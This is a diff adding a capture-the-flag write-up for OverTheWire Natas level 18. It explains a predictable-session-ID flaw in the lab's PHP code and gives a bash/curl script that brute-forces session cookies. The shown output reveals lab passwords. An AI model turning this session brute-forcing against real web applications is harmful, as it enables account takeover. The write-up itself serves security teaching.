@@ -1463,10 +1463,186 @@ Prevent **SQL injection** from leaking data via timing (`SLEEP(...)`) attacks.
 
 ### Level 18
 
-- **Date**: 2026-04-01
+- **Date**: 2026-04-04
 - **URL**: `http://natas18.natas.labs.overthewire.org`
 - **Password**: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
-- **Tools**: Web Browser
+- **Tools**: Web Browser, `PHP`, `Bash`, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+<p>
+Please login with your admin account to retrieve credentials for natas19.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+}
+
+if($showform) {
+?>
+```
+
+Notice `rand(1, $maxid)` in `createID()`. This means that there are only 640 possible session IDs!
+
+If `$SESSION["admin"] == 1`, the page will print the password for natas19.
+
+`session_start()` will implicitly call `session_id()` to get the session ID from the `PHPSESSID` cookie, and then load the corresponding session file.
+
+So we can just try all possible session IDs from 1 to 640 and see if any of them have `admin` set to 1!
+
+Let's automate this with a script again!
+
+[level-18\session_bruteforce.bash](level-18\session_bruteforce.bash)
+```bash
+#!/bin/bash
+
+URL="http://natas18.natas.labs.overthewire.org/"
+USER="natas18"
+PASS="$1"
+
+if [ -z "$PASS" ]; then
+    echo "Usage: $0 <password>"
+    exit 1
+fi
+
+for i in $(seq 1 640); do
+    echo -ne "[*] Testing session $i/640\r"
+
+    RESPONSE=$(curl -s -u "$USER:$PASS" --cookie "PHPSESSID=$i" "$URL")
+
+    if echo "$RESPONSE" | grep -q "You are an admin"; then
+        echo
+        echo "[+] Found admin session: $i"
+        echo "$RESPONSE"
+        exit 0
+    fi
+done
+
+echo
+echo "[-] No admin session found"
+```
+
+Run `bash level-18/session_bruteforce.bash 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ` and you will get:
+```powershell
+[*] Testing session 119/640
+[+] Found admin session: 119
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+And the password for natas19 is `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`.
+
+#### The Lesson
+
+Don't use **predictable session IDs**! (And really do use proper authentication methods instead of this custom one.)
+
+### Level 19
+
+- **Date**: 2026-04-04
+- **URL**: `http://natas19.natas.labs.overthewire.org`
+- **Password**: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
+- **Tools**: Web Browser, `PHP`, `Bash`, `curl`
 
 #### The Solution
 
